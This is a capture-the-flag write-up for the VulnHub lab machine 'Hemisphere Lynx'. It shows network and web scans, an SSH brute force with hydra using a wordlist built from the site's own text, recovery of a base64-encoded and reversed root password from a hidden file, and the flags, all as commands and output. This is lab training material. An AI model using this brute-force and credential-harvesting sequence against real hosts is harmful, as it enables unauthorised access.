
# Hemisphere Lynx - CTF

Available on VulnHub: https://www.vulnhub.com/entry/hemisphere-lynx,577/


## IP Discovery

```
$ sudo netdiscover -r 192.168.1.0/16
```

```
Currently scanning: Finished!   |   Screen View: Unique Hosts

0 Captured ARP Req/Rep packets, from 0 hosts.   Total size: 0
_____________________________________________________________________________
 IP            At MAC Address     Count     Len  MAC Vendor / Hostname
-----------------------------------------------------------------------------
xxx.xxx.x.x     xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
192.168.1.101   08:00:27:d9:69:5a      1      60  PCS Systemtechnik GmbH
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
```

## Port Scanning

```
$ nmap -AT4 -p- 192.168.1.101
```

```
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-17 20:51 -03
Nmap scan report for 192.168.1.101
Host is up (0.00029s latency).
Not shown: 65530 closed ports
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 3.0.3
22/tcp  open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 26:21:06:43:f3:27:b0:2f:df:eb:37:c0:26:d7:58:2a (RSA)
|   256 cd:a2:e4:63:31:78:79:a1:56:1d:1d:bd:85:ee:6b:fb (ECDSA)
|_  256 dd:bc:7e:1d:a3:ad:ff:aa:1a:3f:d3:68:a4:42:ea:1b (ED25519)
80/tcp  open  http        Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title:  Lynx 
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
Service Info: Host: LYNX; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -20m00s, deviation: 34m37s, median: -1s
|_nbstat: NetBIOS name: LYNX, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.9.5-Debian)
|   Computer name: lynx
|   NetBIOS computer name: LYNX\x00
|   Domain name: \x00
|   FQDN: lynx
|_  System time: 2021-02-18T00:51:34+01:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-02-17T23:51:34
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.81 seconds
```

## Web Analysis

```
$ dirb http://192.168.1.101

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Wed Feb 17 20:52:13 2021
URL_BASE: http://192.168.1.101/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.1.101/ ----
+ http://192.168.1.101/index.html (CODE:200|SIZE:918)                                                                
+ http://192.168.1.101/server-status (CODE:403|SIZE:278)                                                             
                                                                                                                     
-----------------
END_TIME: Wed Feb 17 20:52:17 2021
DOWNLOADED: 4612 - FOUND: 2
```

```
$ nikto -h http://192.168.1.101

- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.1.101
+ Target Hostname:    192.168.1.101
+ Target Port:        80
+ Start Time:         2021-02-17 20:52:34 (GMT-3)
---------------------------------------------------------------------------
+ Server: Apache/2.4.38 (Debian)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Server may leak inodes via ETags, header found with file /, inode: 396, size: 5b09d7f56a899, mtime: gzip
+ Allowed HTTP Methods: GET, POST, OPTIONS, HEAD 
+ OSVDB-3233: /icons/README: Apache default file found.
+ 7917 requests: 0 error(s) and 6 item(s) reported on remote host
+ End Time:           2021-02-17 20:53:21 (GMT-3) (47 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

```
$ gobuster dir -t 50 -u http://192.168.1.101 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.txt,.js,/,.html
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://192.168.1.101
[+] Threads:        50
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php,txt,js,/,html
[+] Timeout:        10s
===============================================================
2021/02/17 20:52:04 Starting gobuster
===============================================================
/index.html (Status: 200)
/server-status (Status: 403)
===============================================================
2021/02/17 20:56:58 Finished
===============================================================
```

We couldn't find nothing interesting...\
In VulnHub page, the author left a hint: **Enumeration | Brute Forze**

## Enumeration

I generated a custom wordlist with the content of index page.
```
$ cewl http://192.168.1.101/index.html > wordlist.txt

$ cat wordlist.txt 
CeWL 5.4.8 (Inclusion) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
Lynx
del
lince
entre
Lince
una
constelación
hemisferio
norte
introducido
siglo
XVII
por
johannes
hevelius
origen
nombre
debe
poca
luminosidad
sus
astros
pues
necesita
ojos
para
poder
verla
Para
localizar
hay
que
buscar
dos
constelaciones
muy
luminosas
osa
mayor
auriga
Debe
contener
las
palabras
clave
tratar
atraer
clicks
longitud
caracteres
```

## SSH Brute Forcing

With this wordlist I attempt to brute force SSH login
```
$ hydra -l wordlist.txt -P wordlist.txt 192.168.1.146 -f -t 32 ssh

Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-02-17 21:05:28
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 32 tasks per 1 server, overall 32 tasks, 2601 login tries (l:51/p:51), ~82 tries per task
[DATA] attacking ssh://192.168.1.101:22/

[STATUS] 722.00 tries/min, 722 tries in 00:01h, 1903 to do in 00:03h, 32 active
[22][ssh] host: 192.168.1.101   login: johannes   password: constelaciones
[STATUS] attack finished for 192.168.1.101 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-02-17 21:06:40
```

Credentials:
* User: **johannes**
* Pass: **constelaciones**

## SSH Access

```
$ ssh johannes@192.168.1.101
johannes@192.168.1.101's password: constelaciones

Linux Lynx 4.19.0-11-amd64 #1 SMP Debian 4.19.146-1 (2020-09-17) x86_64

                      <>
        .-"""-.       ||::::::==========
       /= ___  \      ||::::::==========
      |- /~~~\  |     ||::::::==========
      |=( '.' ) |     ||================
      \__\_=_/__/     ||================
       {_______}      ||================
     /` *       `'--._||
    /= .     [] .     { >
   /  /|d4t4s3c|`'--'|| 
  (   )\_______/      ||
   \``\/       \      ||
    `-| ==    \_|     ||
      /         |     ||
     |=   >\  __/     ||
     \   \ |- --|     ||
      \ __| \___/     ||
Lynx _{__} _{__}     ||
     (    )(    )     ||
 ^^~  `"""  `"""  ~^^^~^^~~~^^^~^^^~^^^~^^~^~^^^~^^~^~~^^^~^^
██╗    ██╗███████╗██╗      ██████╗ ██████╗ ███╗   ███╗███████╗
██║    ██║██╔════╝██║     ██╔════╝██╔═══██╗████╗ ████║██╔════╝
██║ █╗ ██║█████╗  ██║     ██║     ██║   ██║██╔████╔██║█████╗  
██║███╗██║██╔══╝  ██║     ██║     ██║   ██║██║╚██╔╝██║██╔══╝  
╚███╔███╔╝███████╗███████╗╚██████╗╚██████╔╝██║ ╚═╝ ██║███████╗
 ╚══╝╚══╝ ╚══════╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚══════╝

Last login: Thu Oct  1 21:37:01 2020 from 192.168.1.140

johannes@Lynx:~$ id
uid=1000(johannes) gid=1000(johannes) grupos=1000(johannes),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth)
```

## Flag #1 - User

```
johannes@Lynx:~$ cat user.txt
uZ8iARX2aiDV1bNz7Dx4
```

## Privilege Escalation

In `Desktop` directory we can find a interesting file.
```
johannes@Lynx:~/Desktop$ cat .creds
MjBLbDdpUzFLQ2FuaU84RFdNemg6dG9vcg==
```

It seems Base64 encoded, so lets decode it
```
$ echo "MjBLbDdpUzFLQ2FuaU84RFdNemg6dG9vcg==" | base64 -d
20Kl7iS1KCaniO8DWMzh:toor
```

The decoded blob seems like inverted, lets revert it
```
$ echo "20Kl7iS1KCaniO8DWMzh:toor" | rev
root:hzMWD8OinaCK1Si7lK02
```

Now we have the root password
```
johannes@Lynx:~$ su root
Contraseña: hzMWD8OinaCK1Si7lK02

root@Lynx:/home/johannes# id
uid=0(root) gid=0(root) grupos=0(root)
```

## Flag #2 - Root

```
root@Lynx:~# cat root.txt
4xKWoV6QGHTetItzD7mI
```
